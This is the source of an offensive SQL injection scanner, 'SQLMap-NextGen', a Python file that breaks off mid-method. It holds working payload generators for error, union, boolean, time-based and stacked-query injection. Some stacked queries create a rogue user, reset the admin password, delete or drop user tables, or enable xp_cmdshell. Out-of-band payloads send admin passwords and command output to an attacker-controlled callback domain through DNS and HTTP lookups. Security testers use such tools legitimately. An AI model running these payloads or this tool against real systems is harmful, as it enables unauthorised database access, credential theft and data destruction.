#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQLMap-NextGen: Advanced SQL Injection Scanner
Author: 554252452423
License: MIT
Version: 1.0.0

A comprehensive tool for detecting and exploiting SQL injection vulnerabilities
with support for multiple injection techniques and minimal false positives.
"""

import argparse
import asyncio
import aiohttp
import difflib
import hashlib
import json
import logging
import os
import random
import re
import socket
import string
import sys
import time
import urllib.parse
import uuid
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Dict, List, Tuple, Set, Optional, Union, Any, Callable

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("sqlmap_next_gen.log"),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger("SQLMap-NextGen")

# Banner
BANNER = """
███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗       ███╗   ██╗███████╗██╗  ██╗████████╗     ██████╗ ███████╗███╗   ██╗
██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗      ████╗  ██║██╔════╝╚██╗██╔╝╚══██╔══╝    ██╔════╝ ██╔════╝████╗  ██║
███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝█████╗██╔██╗ ██║█████╗   ╚███╔╝    ██║       ██║  ███╗█████╗  ██╔██╗ ██║
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ ╚════╝██║╚██╗██║██╔══╝   ██╔██╗    ██║       ██║   ██║██╔══╝  ██║╚██╗██║
███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║           ██║ ╚████║███████╗██╔╝ ██╗   ██║       ╚██████╔╝███████╗██║ ╚████║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝           ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝        ╚═════╝ ╚══════╝╚═╝  ╚═══╝
                                                                                                                              
Advanced SQL Injection Scanner v1.0.0
-- Minimal False Positives, Maximum Detection --
"""

# Constants
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

# Common SQL injection error patterns
ERROR_PATTERNS = {
    'mysql': [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQL Query fail.*",
        r"SQL syntax.*MariaDB server",
        r"Error: ER_PARSE_ERROR:",
    ],
    'postgresql': [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"Warning.*PostgreSQL",
        r"PG::SyntaxError:",
    ],
    'microsoft': [
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"OLE DB.*SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_.*",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\.",
    ],
    'oracle': [
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Warning.*oci_.*",
        r"Oracle.*Driver",
    ],
    'sqlite': [
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        r"Warning.*sqlite_.*",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
    ],
    'ibm_db2': [
        r"CLI Driver.*DB2",
        r"DB2 SQL error",
        r"db2_.*\W(SQL|sql).*Error",
    ],
    'generic': [
        r"SQL syntax.*",
        r"Syntax error.*SQL",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"Syntax error.*in query expression",
        r"Error converting data type.*",
        r"javax\.servlet\.ServletException",
        r"java\.sql\.SQLException",
        r"ORA-[0-9][0-9][0-9]",
        r"Microsoft SQL Server",
        r"PostgreSQL query failed",
        r"Unexpected end of command in statement",
        r"ERROR at line [0-9]",
        r"Query failed: ERROR",
    ]
}

class SQLiPayloadGenerator:
    """
    Generate payloads for different types of SQL injection attacks.
    """
    
    def __init__(self, custom_payloads_file=None):
        self.time_delay = 5  # Seconds for time-based attacks
        self.custom_payloads = {}
        
        # Load custom payloads if provided
        if custom_payloads_file and os.path.exists(custom_payloads_file):
            self._load_custom_payloads(custom_payloads_file)
    
    def _load_custom_payloads(self, file_path):
        """Load custom payloads from a JSON file"""
        try:
            with open(file_path, 'r') as f:
                self.custom_payloads = json.load(f)
                logger.info(f"Loaded custom payloads from {file_path}")
        except Exception as e:
            logger.error(f"Failed to load custom payloads: {e}")
    
    def generate_error_based(self, dbms=None) -> List[str]:
        """Generate error-based injection payloads"""
        if dbms and dbms.lower() in self.custom_payloads.get('error_based', {}):
            return self.custom_payloads['error_based'][dbms.lower()]
        
        # Default payloads
        payloads = [
            "' OR 1=1 -- ",
            "\" OR 1=1 -- ",
            "') OR 1=1 -- ",
            "\") OR 1=1 -- ",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1='1",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' GROUP BY 1--+",
            "1' GROUP BY 2--+",
            "' HAVING 1=1 --",
            "' UNION SELECT @@version --",
            "' UNION ALL SELECT @@version --",
            "' OR (SELECT 8164 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(8164=8164,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
            "' AND (SELECT 6840 FROM (SELECT(SLEEP(0)))hLTz) --",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176706b71,0x78435671584c704f6f6e635542794e61435749646e436e4c79445a72684a6258584c4273544474766b,0x7176707671)-- ",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1), 0x7e)) --",
        ]
        
        # DBMS specific payloads
        if dbms:
            dbms = dbms.lower()
            if dbms == 'mysql':
                payloads.extend([
                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y) --",
                    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(4126=4126,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)) --",
                ])
            elif dbms == 'postgresql':
                payloads.extend([
                    "' AND 1=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)) AS NUMERIC) --",
                    "' AND 1=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113))||(SELECT version())::text||(CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)) AS NUMERIC) --",
                    "' AND 1=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113))||(SELECT current_database())::text||(CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)) AS NUMERIC) --",
                ])
            elif dbms == 'mssql':
                payloads.extend([
                    "' AND 1=CONVERT(INT, (SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(118)+CHAR(113)+(SELECT CASE WHEN (1=1) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(118)+CHAR(113))) --",
                    "'; IF 1=1 WAITFOR DELAY '0:0:0' ELSE WAITFOR DELAY '0:0:5' -- ",
                    "'; EXEC xp_cmdshell('ping -n 1 localhost') -- ",
                    "'; EXEC master..xp_cmdshell('ping -n 1 localhost') -- ",
                ])
            elif dbms == 'oracle':
                payloads.extend([
                    "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) --",
                    "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)||(SELECT user FROM DUAL)||CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) --",
                ])
            elif dbms == 'sqlite':
                payloads.extend([
                    "' AND 1=1 AND '1'='1",
                    "' AND 1=1 AND '%'='",
                    "' AND sqlite_version() --",
                ])
        
        return payloads
    
    def generate_union_based(self, column_count=None) -> List[str]:
        """Generate union-based injection payloads"""
        if 'union_based' in self.custom_payloads:
            return self.custom_payloads['union_based']
        
        payloads = []
        
        # If column count is provided, generate specific UNION payloads
        if column_count:
            nulls = ','.join(['NULL'] * column_count)
            payloads.extend([
                f"' UNION ALL SELECT {nulls} -- ",
                f"\" UNION ALL SELECT {nulls} -- ",
                f"') UNION ALL SELECT {nulls} -- ",
                f"\") UNION ALL SELECT {nulls} -- ",
            ])
            
            # Generate payloads with different column combinations that include string markers
            for i in range(1, column_count + 1):
                cols = ['NULL'] * column_count
                cols[i-1] = "'SQLi'"
                payload = ','.join(cols)
                payloads.append(f"' UNION ALL SELECT {payload} -- ")
        else:
            # Otherwise generate payloads for common column counts
            for i in range(1, 21):  # Test up to 20 columns
                nulls = ','.join(['NULL'] * i)
                payloads.append(f"' UNION ALL SELECT {nulls} -- ")
                payloads.append(f"\" UNION ALL SELECT {nulls} -- ")
                payloads.append(f"') UNION ALL SELECT {nulls} -- ")
                payloads.append(f"\") UNION ALL SELECT {nulls} -- ")
            
            # Add some common table information extraction payloads
            payloads.extend([
                "' UNION ALL SELECT table_name,2 FROM information_schema.tables -- ",
                "' UNION ALL SELECT column_name,2 FROM information_schema.columns -- ",
                "' UNION ALL SELECT 1,table_name FROM all_tables -- ",  # Oracle
                "' UNION ALL SELECT 1,name FROM sysobjects WHERE xtype='U' -- ",  # SQL Server
            ])
        
        return payloads
    
    def generate_boolean_based(self) -> List[str]:
        """Generate boolean-based blind injection payloads"""
        if 'boolean_based' in self.custom_payloads:
            return self.custom_payloads['boolean_based']
        
        # Pairs of true/false conditions to test
        pairs = [
            ("' AND 1=1 -- ", "' AND 1=2 -- "),
            ("\" AND 1=1 -- ", "\" AND 1=2 -- "),
            ("' OR 1=1 -- ", "' OR 1=2 -- "),
            ("\" OR 1=1 -- ", "\" OR 1=2 -- "),
            ("') AND 1=1 -- ", "') AND 1=2 -- "),
            ("\") AND 1=1 -- ", "\") AND 1=2 -- "),
            ("' AND 'x'='x' -- ", "' AND 'x'='y' -- "),
            ("' AND 9876=9876 -- ", "' AND 9876=9875 -- "),
            ("' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)) -- ", "' RLIKE (SELECT (CASE WHEN (1=2) THEN 1 ELSE 0x28 END)) -- "),
            ("' OR EXISTS(SELECT 1) -- ", "' OR EXISTS(SELECT 0) -- "),
        ]
        
        # Flatten pairs into a single list
        return [p for pair in pairs for p in pair]
    
    def generate_time_based(self) -> List[str]:
        """Generate time-based blind injection payloads"""
        if 'time_based' in self.custom_payloads:
            return self.custom_payloads['time_based']
        
        delay = self.time_delay
        
        # Generic time-based payloads for different DBMS
        payloads = [
            # MySQL
            f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a) -- ",
            f"\" AND (SELECT * FROM (SELECT(SLEEP({delay})))a) -- ",
            f"') AND (SELECT * FROM (SELECT(SLEEP({delay})))a) -- ",
            f"\") AND (SELECT * FROM (SELECT(SLEEP({delay})))a) -- ",
            f"' OR (SELECT * FROM (SELECT(SLEEP({delay})))a) -- ",
            f"\" OR (SELECT * FROM (SELECT(SLEEP({delay})))a) -- ",
            f"' AND SLEEP({delay}) -- ",
            f"\" AND SLEEP({delay}) -- ",
            f"' OR SLEEP({delay}) -- ",
            f"\" OR SLEEP({delay}) -- ",
            f"' AND IF(1=1, SLEEP({delay}), 0) -- ",
            f"' AND IF(1=2, 0, SLEEP({delay})) -- ",
            
            # PostgreSQL
            f"' AND (SELECT pg_sleep({delay})) -- ",
            f"\" AND (SELECT pg_sleep({delay})) -- ",
            f"') AND (SELECT pg_sleep({delay})) -- ",
            f"\") AND (SELECT pg_sleep({delay})) -- ",
            f"' OR (SELECT pg_sleep({delay})) -- ",
            f"\" OR (SELECT pg_sleep({delay})) -- ",
            f"'; SELECT pg_sleep({delay}) -- ",
            
            # SQL Server
            f"' WAITFOR DELAY '0:0:{delay}' -- ",
            f"\" WAITFOR DELAY '0:0:{delay}' -- ",
            f"') WAITFOR DELAY '0:0:{delay}' -- ",
            f"\") WAITFOR DELAY '0:0:{delay}' -- ",
            f"'; WAITFOR DELAY '0:0:{delay}' -- ",
            f"\"; WAITFOR DELAY '0:0:{delay}' -- ",
            
            # Oracle
            f"' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),{delay}) FROM DUAL) IS NOT NULL -- ",
            f"\" AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),{delay}) FROM DUAL) IS NOT NULL -- ",
            f"' BEGIN DBMS_LOCK.SLEEP({delay}); END; -- ",
            
            # SQLite
            f"' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000/2))))) -- ",
            f"\" AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000/2))))) -- ",
        ]
        
        return payloads
    
    def generate_stacked_queries(self) -> List[str]:
        """Generate stacked queries injection payloads"""
        if 'stacked_queries' in self.custom_payloads:
            return self.custom_payloads['stacked_queries']
        
        payloads = [
            "'; INSERT INTO users (username,password) VALUES ('hacker','password123'); -- ",
            "\"; INSERT INTO users (username,password) VALUES ('hacker','password123'); -- ",
            "'); INSERT INTO users (username,password) VALUES ('hacker','password123'); -- ",
            "\"); INSERT INTO users (username,password) VALUES ('hacker','password123'); -- ",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; -- ",
            "\"; UPDATE users SET password='hacked' WHERE username='admin'; -- ",
            "'); UPDATE users SET password='hacked' WHERE username='admin'; -- ",
            "\"); UPDATE users SET password='hacked' WHERE username='admin'; -- ",
            "'; DELETE FROM users; -- ",
            "\"; DELETE FROM users; -- ",
            "'); DELETE FROM users; -- ",
            "\"); DELETE FROM users; -- ",
            "'; DROP TABLE users; -- ",
            "\"; DROP TABLE users; -- ",
            "'); DROP TABLE users; -- ",
            "\"); DROP TABLE users; -- ",
            "'; CREATE TABLE access (id int, username varchar(20), password varchar(20)); -- ",
            "'; SELECT @@version; -- ",
            "'; SELECT version(); -- ",
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- ",
        ]
        
        return payloads
    
    def generate_oob_payloads(self, callback_domain) -> List[str]:
        """Generate Out-of-Band (OOB) SQL injection payloads"""
        if 'oob' in self.custom_payloads:
            # Replace placeholder domain with actual callback domain
            return [p.replace("{DOMAIN}", callback_domain) for p in self.custom_payloads['oob']]
        
        # Generate unique subdomain for this test to track responses accurately
        unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        subdomain = f"{unique_id}.{callback_domain}"
        
        payloads = [
            # MySQL
            f"' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.{subdomain}\\\\a.txt')) -- ",
            f"' UNION ALL SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{subdomain}\\\\a.txt')) -- ",
            
            # SQL Server
            f"'; exec master..xp_dirtree '//{subdomain}/a' -- ",
            f"'; exec master..xp_fileexist '//{subdomain}/a' -- ",
            f"'; DECLARE @q VARCHAR(8000);SET @q=CONCAT(CHAR(39),(SELECT TOP 1 password FROM users WHERE username='admin'),CHAR(39));EXEC('master..xp_dirtree''\\\\'+(SELECT @q)+'.{subdomain}\\\\a''') -- ",
            
            # PostgreSQL
            f"'; COPY (SELECT version()) TO PROGRAM 'nslookup $(whoami).{subdomain}' -- ",
            f"'; DO $$BEGIN PERFORM DBLINK_CONNECT('host={subdomain} user=postgres password=postgres'); END$$ -- ",
            
            # Oracle
            f"' AND UTL_HTTP.REQUEST('http://'||(SELECT user FROM DUAL)||'.{subdomain}') -- ",
            f"' AND UTL_INADDR.GET_HOST_NAME((SELECT password FROM users WHERE username='admin')||'.{subdomain}') -- ",
            f"' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='admin')||'.{subdomain}') -- ",
            
            # Generic
            f"' UNION ALL SELECT 1,load_file(concat('\\\\\\\\',(select database()),'.{subdomain}\\\\evil.jpg')),1,1,1 -- ",
            f"' UNION ALL SELECT 1,2,3,4,5,6,7,8,load_file(0x5c5c5c5c.concat((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),'.{subdomain}\\\\evil.jpg')) -- ",
        ]
        
        return payloads

class URLAnalyzer:
    """
    Analyzes URLs to identify potential SQL injection points.
    """
    
    @staticmethod
    def extract_parameters(url: str) -> Dict[str, str]:
        """Extract parameters from a URL"""
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        # Convert from lists to single values
        return {k: v[0] for k, v in query_params.items()}
    
    @staticmethod
    def build_url_with_params(base_url: str, params: Dict[str, str]) -> str:
        """Build a URL with the given parameters"""
        query_string = urllib.parse.urlencode(params)
        parsed_url = urllib.parse.urlparse(base_url)
        
        # Preserve the original URL path
        url_parts = list(parsed_url)
        url_parts[4] = query_string  # Replace query
        
        return urllib.parse.urlunparse(url_parts)
    
    @staticmethod
    def get_base_url(url: str) -> str:
        """Get the base URL without query parameters"""
        parsed_url = urllib.parse.urlparse(url)
        return urllib.parse.urlunparse([
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            '',  # No query
            ''   # No fragment
        ])

class RequestManager:
    """
    Handles HTTP requests with various payloads.
    """
    
    def __init__(self, proxy=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
        self.proxy = proxy
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        
        # Set default headers if not provided
        if 'User-Agent' not in self.headers:
            self.headers['User-Agent'] = random.choice(USER_AGENTS)
        
        # Track baseline responses
        self.baselines = {}
    
    async def initialize_session(self):
        """Initialize aiohttp session with configured settings"""
        # Configure proxies if needed
        if self.proxy:
            proxy_auth = None
            if '@' in self.proxy:
                auth_part, proxy_part = self.proxy.split('@')
                proxy_auth = aiohttp.BasicAuth(*auth_part.replace('http://', '').replace('https://', '').split(':'))
                proxy = f"http://{proxy_part}"
            else:
                proxy = self.proxy
            
            conn = aiohttp.TCPConnector(verify_ssl=self.verify_ssl)
            self.session = aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                headers=self.headers,
                cookies=self.cookies,
                trust_env=True,
                proxy=proxy,
                proxy_auth=proxy_auth
            )
        else:
            conn = aiohttp.TCPConnector(verify_ssl=self.verify_ssl)
            self.session = aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                headers=self.headers,
                cookies=self.cookies,
                trust_env=True
            )
    
    async def close_session(self):
        """Close the aiohttp session"""
        if hasattr(self, 'session'):
            await self.session.close()
    
    async def get_baseline(self, url: str, method: str = 'GET', data: Dict = None) -> Dict:
        """Get baseline response for comparison"""
        baseline_key = f"{method}:{url}"
        
        if baseline_key in self.baselines:
            return self.baselines[baseline_key]
        
        try:
            if not hasattr(self, 'session'):
                await self.initialize_session()
            
            start_time = time.time()
            
            if method.upper() == 'GET':
                async with self.session.get(url, timeout=self.timeout) as response:
                    status = response.status
                    response_time = time.time() - start_time
                    body = await response.text()
                    content_length = len(body)
                    headers = dict(response.headers)
            else:  # POST
                async with self.session.post(url, data=data, timeout=self.timeout) as response:
                    status = response.status
                    response_time = time.time() - start_time
                    body = await response.text()
                    content_length = len(body)
                    headers = dict(response.headers)
            
            # Generate a hash of the response for comparison
            body_hash = hashlib.md5(body.encode()).hexdigest()
            
            baseline = {
                'status': status,
                'response_time': response_time,
                'content_length': content_length,
                'body_hash': body_hash,
                'body': body,
                'headers': headers
            }
            
            self.baselines[baseline_key] = baseline
            return baseline
        
        except Exception as e:
            logger.error(f"Error getting baseline for {url}: {e}")
            return {
                'status': 0,
                'response_time': 0,
                'content_length': 0,
                'body_hash': '',
                'body': '',
                'headers': {},
                'error': str(e)
            }
    
    async def send_request(self, url: str, method: str = 'GET', data: Dict = None, 
                     expect_time_delay: bool = False) -> Dict:
        """Send a request and return relevant response data"""
        try:
            if not hasattr(self, 'session'):
                await self.initialize_session()
            
            start_time = time.time()
            
            if method.upper() == 'GET':
                async with self.session.get(url, timeout=self.timeout) as response:
                    status = response.status
                    response_time = time.time() - start_time
                    body = await response.text()
                    content_length = len(body)
                    headers = dict(response.headers)
            else:  # POST
                async with self.session.post(url, data=data, timeout=self.timeout) as response:
                    status = response.status
                    response_time = time.time() - start_time
                    body = await response.text()
                    content_length = len(body)
                    headers = dict(response.headers)
            
            # Generate a hash of the response for comparison
            body_hash = hashlib.md5(body.encode()).hexdigest()
            
            return {
                'status': status,
                'response_time': response_time,
                'content_length': content_length,
                'body_hash': body_hash,
                'body': body,
                'headers': headers
            }
        
        except aiohttp.ClientError as e:
            logger.error(f"Client error when requesting {url}: {e}")
            
            # Special case for time-based payloads that might cause timeouts
            if expect_time_delay and isinstance(e, asyncio.TimeoutError):
                return {
                    'status': 0,
                    'response_time': self.timeout,
                    'content_length': 0,
                    'body_hash': '',
                    'body': '',
                    'headers': {},
                    'timeout': True,
                    'error': str(e)
                }
            
            return {
                'status': 0,
                'response_time': 0,
                'content_length': 0,
                'body_hash': '',
                'body': '',
                'headers': {},
                'error': str(e)
            }
        except Exception as e:
            logger.error(f"Error sending request to {url}: {e}")
            return {
                'status': 0,
                'response_time': 0,
                'content_length': 0,
                'body_hash': '',
                'body': '',
                'headers': {},
                'error': str(e)
            }
    
    def get_similarity_ratio(self, str1: str, str2: str) -> float:
        """Calculate the similarity ratio between two strings"""
        return difflib.SequenceMatcher(None, str1, str2).ratio()

class ResponseAnalyzer:
    """
    Analyzes HTTP responses to detect SQL injection vulnerabilities.
    """
    
    def __init__(self, time_delay_threshold=3.0):
        """
        Initialize with threshold for time-based attacks
        
        Args:
            time_delay_threshold: Minimum time difference (in seconds) to consider a time-based attack successful
        """
        self.time_delay_threshold = time_delay_threshold
    
    def check_for_errors(self, response: Dict) -> Tuple[bool, str, str]:
        """
        Check response for SQL error messages
        
        Returns:
            Tuple of (is_vulnerable, error_type, evidence)
        """
        if 'error' in response:
            # Request failed, cannot analyze
            return False, "", ""
        
        body = response.get('body', '')
        
        # Check for SQL errors in the response
        for dbms, patterns in ERROR_PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, body, re.IGNORECASE)
                if matches:
                    return True, f"error-based-{dbms}", matches[0]
        
        return False, "", ""
    
    def analyze_time_difference(self, baseline: Dict, response: Dict) -> Tuple[bool, float]:
        """
        Analyze time difference between baseline and response for time-based attacks
        
        Returns:
            Tuple of (is_delayed, time_difference)
        """
        # Handle timeout case first
        if response.get('timeout', False):
            return True, self.time_delay_threshold
            
        baseline_time = baseline.get('response_time', 0)
        response_time = response.get('response_time', 0)
        
        time_diff = response_time - baseline_time
        is_delayed = time_diff >= self.time_delay_threshold
        
        return is_delayed, time_diff
    
    def analyze_content_difference(self, baseline: Dict, response: Dict, 
                                  threshold: float = 0.95) -> Tuple[bool, float]:
        """
        Analyze content difference between baseline and response
        
        Args:
            baseline: Baseline response dictionary
            response: Test response dictionary
            threshold: Similarity threshold below which responses are considered different
            
        Returns:
            Tuple of (is_different, similarity_ratio)
        """
        baseline_body = baseline.get('body', '')
        response_body = response.get('body', '')
        
        # If either response body is empty or there was an error, skip comparison
        if not baseline_body or not response_body or 'error' in response:
            return False, 0.0
        
        # Calculate similarity ratio between bodies
        similarity = difflib.SequenceMatcher(None, baseline_body, response_body).ratio()
        is_different = similarity < threshold
        
        return is_different, similarity
    
    def detect_boolean_difference(self, true_condition: Dict, false_condition: Dict,
                                 threshold: float = 0.8) -> Tuple[bool, float]:
        """
        Detect difference between true and false condition responses for boolean-based attacks
        
        Returns:
            Tuple of (is_vulnerable, difference_ratio)
        """
        if 'error' in true_condition or 'error' in false_condition:
            return False, 0.0
        
        true_body = true_condition.get('body', '')
        false_body = false_condition.get('body', '')
        
        if not true_body or not false_body:
            return False, 0.0
        
        # Use sequence matcher to get similarity ratio
        similarity = difflib.SequenceMatcher(None, true_body, false_body).ratio()
        difference = 1 - similarity
        
        # If responses are sufficiently different, it might indicate boolean-based vulnerability
        return difference > (1 - threshold), difference
    
    def analyze_union_response(self, baseline: Dict, response: Dict, column_pattern: str = "SQLi") -> Tuple[bool, str]:
        """
        Analyze response for successful UNION-based injection
        
        Args:
            baseline: Baseline response
            response: Test response
            column_pattern: Pattern to look for in the response that indicates successful UNION injection
            
        Returns:
            Tuple of (is_vulnerable, evidence)
        """
        if 'error' in response:
            return False, ""
        
        baseline_body = baseline.get('body', '')
        response_body = response.get('body', '')
        
        # If test pattern appears in response but not in baseline, likely UNION injection
        if column_pattern in response_body and column_pattern not in baseline_body:
            # Get context around the pattern
            pattern_index = response_body.find(column_pattern)
            start = max(0, pattern_index - 20)
            end = min(len(response_body), pattern_index + 20 + len(column_pattern))
            evidence = response_body[start:end]
            return True, evidence
        
        # Look for common database information that might be exposed
        db_patterns = [
            r"DATABASE\(\) = '([^']+)'",
            r"@@database = '([^']+)'",
            r"version\(\) = '([^']+)'",
            r"@@version = '([^']+)'",
            r"user\(\) = '([^']+)'",
            r"system_user\(\) = '([^']+)'",
            r"@@hostname = '([^']+)'",
            r"sqlite_version\(\) = '([^']+)'",
        ]
        
        for pattern in db_patterns:
            matches = re.search(pattern, response_body, re.IGNORECASE)
            if matches and not re.search(pattern, baseline_body, re.IGNORECASE):
                return True, matches.group(0)
        
        # Look for table or column names that might be exposed
        table_patterns = [
            r"TABLE_NAME\s*=\s*'([^']+)'",
            r"COLUMN_NAME\s*=\s*'([^']+)'",
            r"FROM\s+information_schema\.",
            r"FROM\s+all_tables",
            r"FROM\s+sysobjects",
        ]
        
        for pattern in table_patterns:
            matches = re.search(pattern, response_body, re.IGNORECASE)
            if matches and not re.search(pattern, baseline_body, re.IGNORECASE):
                return True, matches.group(0)
        
        return False, ""

class DNSCallbackHandler:
    """
    Handles DNS callbacks for Out-of-Band SQL injection testing.
    """
    
    def __init__(self, callback_domain, api_key=None):
        self.callback_domain = callback_domain
        self.api_key = api_key
        self.unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self.full_domain = f"{self.unique_id}.{self.callback_domain}"
        self.server_address = None
    
    async def setup_dns_server(self):
        """Set up DNS server for callbacks"""
        # This is a placeholder for integration with a DNS callback service
        # In a real implementation, you would:
        # 1. Create a unique subdomain for this scan
        # 2. Register it with your DNS callback service
        # 3. Set up an API connection to check for callbacks
        logger.info(f"Setting up DNS callback for domain: {self.full_domain}")
        
        if self.callback_domain == "example.com":
            logger.warning("Using example.com as callback domain. This won't work for actual testing.")
            logger.warning("Please specify a valid callback domain that you control.")
        
        try:
            # Initialize connection to DNS callback service
            if self.api_key:
                logger.info("Initialized callback service with provided API key")
            
            self.server_address = self.full_domain
            logger.info(f"DNS callback server initialized: {self.server_address}")
            return True
        except Exception as e:
            logger.error(f"Failed to initialize DNS callback service: {e}")
            return False
    
    async def check_for_callbacks(self, timeout=60):
        """
        Check for DNS callbacks within the timeout period
        
        Returns:
            List of callback entries received
        """
        if not self.server_address:
            logger.error("DNS callback server not initialized")
            return []
        
        logger.info(f"Checking for DNS callbacks to {self.server_address} (timeout: {timeout}s)")
        
        # Placeholder for actual implementation which would:
        # 1. Poll the DNS callback service API
        # 2. Look for requests to your unique subdomain
        # 3. Return details about any callbacks received
        
        # Simulate waiting for callbacks
        await asyncio.sleep(timeout)
        
        # In a real implementation, you would query your DNS callback service
        # for any DNS lookups to your unique domain within the timeout period
        return []

class SQLiScanner:
    """
    Main SQL injection scanner class.
    """
    
    def __init__(self, request_manager: RequestManager, payload_generator: SQLiPayloadGenerator,
                response_analyzer: ResponseAnalyzer):
        self.request_manager = request_manager
        self.payload_generator = payload_generator
        self.response_analyzer = response_analyzer
        self.url_analyzer = URLAnalyzer()
        self.scan_results = {}
        self.vulnerabilities_found = []
    
    async def scan_url(self, url: str, method: str = 'GET', data: Dict = None, 
                      scan_techniques: List[str] = None, callback_domain: str = None,
                      dbms: str = None):
        """
        Scan a URL for SQL injection vulnerabilities
        
        Args:
            url: Target URL
